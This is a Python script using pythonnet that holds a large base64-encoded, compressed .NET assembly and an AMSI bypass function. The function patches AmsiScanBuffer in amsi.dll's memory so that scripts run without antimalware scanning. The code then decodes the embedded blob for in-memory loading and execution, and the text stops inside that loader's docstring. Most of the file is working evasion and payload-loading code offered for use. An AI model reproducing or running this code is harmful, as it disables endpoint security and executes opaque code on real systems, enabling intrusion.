import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
